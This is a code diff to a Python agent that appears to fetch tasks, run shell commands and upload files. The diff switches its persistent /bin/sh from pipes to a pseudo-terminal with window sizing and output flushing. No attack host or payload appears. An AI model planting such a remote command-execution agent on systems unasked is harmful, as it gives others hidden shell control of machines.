@@ -1,12 +1,16 @@
 import json
 import os
 import platform
+import pty
 import select
 import socket
 import subprocess
 import sys
 import time
 import uuid
+import fcntl
+import struct
+import termios
 
 try:
     import requests
@@ -99,18 +103,44 @@ def submit_result(agent_id, task_id, output, status="success"):
 
 
 persistent_shell = None
+persistent_master = None
+
 
 def get_persistent_shell():
-    global persistent_shell
+    global persistent_shell, persistent_master
     if persistent_shell is None or persistent_shell.poll() is not None:
+        master_fd, slave_fd = pty.openpty()
+
+        # Set window size for proper terminal behavior
+        winsize = struct.pack("HHHH", 80, 24, 0, 0)
+        fcntl.ioctl(master_fd, termios.TIOCSWINSZ, winsize)
+
         persistent_shell = subprocess.Popen(
             ["/bin/sh"],
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            bufsize=0,
+            stdin=slave_fd,
+            stdout=slave_fd,
+            stderr=slave_fd,
+            close_fds=True,
         )
-    return persistent_shell
+        os.close(slave_fd)
+        persistent_master = master_fd
+
+        # Wait for shell prompt
+        time.sleep(0.3)
+        _flush_pty()
+    return persistent_shell, persistent_master
+
+
+def _flush_pty():
+    global persistent_master
+    try:
+        while True:
+            r, _, _ = select.select([persistent_master], [], [], 0.05)
+            if not r:
+                break
+            os.read(persistent_master, 65536)
+    except (OSError, ValueError):
+        pass
 
 
 def execute_shell(command):
@@ -131,22 +161,32 @@ def execute_shell(command):
 
 
 def execute_shell_interactive(command):
-    proc = get_persistent_shell()
-    proc.stdin.write((command + "\n").encode())
-    proc.stdin.flush()
+    global persistent_master
+    proc, master = get_persistent_shell()
+
+    _flush_pty()
+    os.write(master, (command + "\n").encode())
 
     output = b""
-    deadline = time.time() + 2
+    deadline = time.time() + 3
     while time.time() < deadline:
-        r, _, _ = select.select([proc.stdout], [], [], 0.1)
+        r, _, _ = select.select([master], [], [], 0.1)
         if r:
-            chunk = os.read(proc.stdout.fileno(), 8192)
+            try:
+                chunk = os.read(master, 8192)
+            except OSError:
+                break
             if not chunk:
                 break
             output += chunk
             deadline = time.time() + 0.5
 
-    return output.decode(errors="replace")
+    result = output.decode(errors="replace")
+    # Strip the echoed command from output
+    lines = result.split("\n")
+    if len(lines) > 1 and lines[0].strip() == command.strip():
+        result = "\n".join(lines[1:])
+    return result
 
 
 def execute_upload(params):
